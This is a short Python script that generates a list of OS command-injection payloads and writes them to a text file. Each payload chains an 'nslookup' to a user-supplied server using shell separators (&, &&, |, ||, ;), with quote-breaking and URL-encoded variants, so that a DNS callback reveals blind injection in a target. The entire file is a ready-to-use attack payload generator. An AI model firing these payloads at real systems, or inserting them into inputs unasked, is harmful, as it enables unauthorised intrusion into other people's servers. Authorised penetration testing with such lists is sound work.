server = input("Enter your server address here: \n")
with open("OSIPGPayloads.txt", "w+") as file:
    file.write(f"""& nslookup {server} &
&& nslookup {server} &&
| nslookup {server} |
|| nslookup {server} ||
; nslookup {server} ;
' & nslookup {server} &
' && nslookup {server} &&
' | nslookup {server} |
' || nslookup {server} ||
' ; nslookup {server} ;
" & nslookup {server} &
" && nslookup {server} &&
" | nslookup {server} |
" || nslookup {server} ||
" ; nslookup {server} ;
%26%20nslookup%20{server}%20%26
%26%26%20nslookup%20{server}%20%26%26
%7C%20nslookup%20{server}%20%7C
%7C%7C%20nslookup%20{server}%20%7C%7C
%3B%20nslookup%20{server}%20%3B
%27%20%26%20nslookup%20{server}%20%26
%27%20%26%26%20nslookup%20{server}%20%26%26
%27%20%7C%20nslookup%20{server}%20%7C
%27%20%7C%7C%20nslookup%20{server}%20%7C%7C
%27%20%3B%20nslookup%20{server}%20%3B
%22%20%26%20nslookup%20{server}%20%26
%22%20%26%26%20nslookup%20{server}%20%26%26
%22%20%7C%20nslookup%20{server}%20%7C
%22%20%7C%7C%20nslookup%20{server}%20%7C%7C
%22%20%3B%20nslookup%20{server}%20%3B""")